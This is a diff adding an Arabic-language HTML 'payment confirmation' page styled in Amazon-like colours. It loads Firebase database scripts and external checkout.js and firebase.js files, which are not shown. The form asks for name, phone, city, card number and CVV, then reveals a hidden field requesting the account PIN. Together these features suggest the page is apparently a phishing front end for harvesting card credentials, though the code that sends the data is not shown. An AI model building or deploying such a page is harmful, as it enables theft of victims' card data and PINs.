@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>الدفع</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="firebase.js"></script>
+
+<style>
+body{
+  font-family:Arial;
+  background:#f5f5f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+}
+.box{
+  background:white;
+  padding:25px;
+  border-radius:10px;
+  width:360px;
+  box-shadow:0 4px 15px rgba(0,0,0,.2);
+}
+h2{text-align:center;color:#131921}
+input,button{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border-radius:5px;
+  border:1px solid #ccc;
+}
+button{
+  background:#f0c14b;
+  border:none;
+  cursor:pointer;
+  font-size:16px;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+<h2>💳 تأكيد الدفع</h2>
+
+<input id="fname" placeholder="الاسم">
+<input id="lname" placeholder="اللقب">
+<input id="address" placeholder="رقم هاتف">
+<input id="city" placeholder="المدينة">
+<input id="town" placeholder="البلدة">
+
+<hr>
+
+<input id="cardNumber" placeholder="رقم البطاقة">
+<input id="cvv" placeholder="CVV" type="number">
+
+<div id="pinBox" style="display:none">
+  <hr>
+  <input id="pin" type="password" placeholder="🔐 أدخل PIN الحساب">
+  <button onclick="verifyPin()">تأكيد PIN</button>
+</div>
+
+
+<button onclick="confirmPayment()">تأكيد الدفع</button>
+</div>
+
+<script src="checkout.js"></script>
+</body>
+</html>
